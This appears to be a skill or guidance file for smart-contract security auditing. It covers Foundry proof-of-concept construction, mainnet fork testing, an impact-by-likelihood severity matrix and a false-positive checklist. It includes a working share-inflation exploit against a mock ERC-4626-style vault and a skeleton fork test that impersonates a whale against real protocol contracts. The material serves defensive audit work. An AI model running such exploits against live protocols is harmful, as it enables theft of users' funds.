---
name: audit-verification
description: Use when constructing proof-of-concept exploits, verifying audit findings against mainnet forks, classifying severity, and eliminating false positives. Covers PoC construction in Foundry, fork-testing vulnerabilities, severity classification, and evidence requirements.
---

# Finding Verification & PoC Construction

## Verification Workflow

```
Finding Hypothesis → PoC Construction → Fork Validation → Severity Classification → Report
```

Every finding above Informational should have a verified PoC or clear explanation of why a PoC is not feasible.

## PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Import the vulnerable contracts
import {Vault} from "../src/Vault.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract PoCShareInflation is Test {
    Vault vault;
    MockERC20 token;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token = new MockERC20("USDC", "USDC", 6);
        vault = new Vault(address(token));

        // Fund actors
        token.mint(attacker, 2_000_000e6);
        token.mint(victim, 1_000_000e6);
    }

    function test_PoC_firstDepositorShareInflation() public {
        // Step 1: Attacker is first depositor
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker); // deposit 1 wei, get 1 share
        console2.log("Attacker shares:", vault.balanceOf(attacker));

        // Step 2: Attacker donates tokens to inflate share price
        token.transfer(address(vault), 1_000_000e6);
        console2.log("Vault total assets:", vault.totalAssets());
        console2.log("Share price:", vault.totalAssets() * 1e6 / vault.totalSupply());
        vm.stopPrank();

        // Step 3: Victim deposits
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(999_999e6, victim);
        console2.log("Victim shares:", victimShares);
        vm.stopPrank();

        // Step 4: Attacker withdraws
        vm.prank(attacker);
        uint256 attackerReceived = vault.redeem(
            vault.balanceOf(attacker), attacker, attacker
        );
        console2.log("Attacker received:", attackerReceived);

        // Verify the exploit: attacker profits at victim's expense
        assertGt(attackerReceived, 1_000_000e6, "attacker should profit");
        uint256 victimLoss = 999_999e6 - vault.convertToAssets(victimShares);
        console2.log("Victim loss:", victimLoss);
        assertGt(victimLoss, 0, "victim should lose funds");
    }
}
```

## Fork-Testing Vulnerabilities

Test against real mainnet state for live protocol findings:

```solidity
contract PoCMainnetExploit is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19_500_000);
    }

    function test_PoC_oracleManipulation() public {
        address target = 0x...; // real protocol address

        // Impersonate a whale
        address whale = 0x...;
        vm.startPrank(whale);

        // Execute the attack against real contracts
        // ...

        // Verify the exploit outcome
        assertGt(profit, 0, "exploit should be profitable");
        vm.stopPrank();
    }
}
```

## Severity Classification Matrix

### Impact Assessment

| Impact Level | Criteria |
|-------------|----------|
| **Critical** | Direct loss of funds, permanent protocol bricking |
| **High** | Significant loss of funds, temporary protocol DoS |
| **Medium** | Moderate loss, griefing, value leakage over time |
| **Low** | Minor impact, informational with edge-case implications |

### Likelihood Assessment

| Likelihood | Criteria |
|-----------|----------|
| **High** | No special conditions, any user can trigger |
| **Medium** | Requires specific conditions (timing, state, capital) |
| **Low** | Requires unlikely conditions or privileged access |

### Severity Matrix

```
              │ High Impact │ Medium Impact │ Low Impact  │
──────────────┼─────────────┼───────────────┼─────────────┤
High Likely   │ CRITICAL    │ HIGH          │ MEDIUM      │
Medium Likely │ HIGH        │ MEDIUM        │ LOW         │
Low Likely    │ MEDIUM      │ LOW           │ INFORMATIONAL│
```

## Evidence Requirements by Severity

### Critical / High
- Working Foundry PoC that demonstrates the vulnerability
- Clear profit/loss calculation
- Affected users/funds estimation
- Fork test against mainnet (when applicable)

### Medium
- PoC or detailed step-by-step exploit scenario
- Impact analysis with realistic assumptions
- Affected code paths identified

### Low
- Code reference showing the issue
- Explanation of conditions required to trigger
- Suggested fix

### Informational
- Code reference
- Best practice recommendation

## False Positive Elimination

Before reporting, verify the finding is NOT a false positive:

```markdown
### False Positive Checklist
□ Is the vulnerable code path actually reachable?
□ Are preconditions achievable in practice?
□ Does the PoC work with realistic parameters?
□ Is the attack economically viable (cost < profit)?
□ Are existing mitigations actually bypassed?
□ Does the finding survive compiler optimizations?
□ Is the issue already documented as a known limitation?
```

### Common False Positives

| Pattern | Why It's Usually False |
|---------|----------------------|
| Rounding in favor of protocol | By design in ERC-4626 |
| Owner can rug | Centralization risk, not a bug |
| Gas griefing on large loops | If loop is bounded, it's fine |
| Timestamp dependence | ±12s is acceptable for most use cases |
| Front-running deposits | Standard AMM behavior |

## Verification Commands

```bash
# Run specific PoC
forge test --match-test "test_PoC" -vvvv

# Run against fork
forge test --match-test "test_PoC" --fork-url $ETH_RPC_URL -vvvv

# Gas cost of exploit
forge test --match-test "test_PoC" --gas-report

# Generate trace for report
forge test --match-test "test_PoC" -vvvv 2>&1 | tee poc-trace.txt
```

## Checklist

- [ ] Each finding has a PoC or detailed exploit scenario
- [ ] PoC runs successfully with `forge test`
- [ ] Fork-tested against mainnet for live protocol findings
- [ ] Severity classified using Impact × Likelihood matrix
- [ ] Evidence requirements met for the assigned severity
- [ ] False positive checklist completed for each finding
- [ ] Attack profitability calculated (revenue - cost - gas)
- [ ] Affected users/funds estimated
- [ ] Recommended fix included with each finding
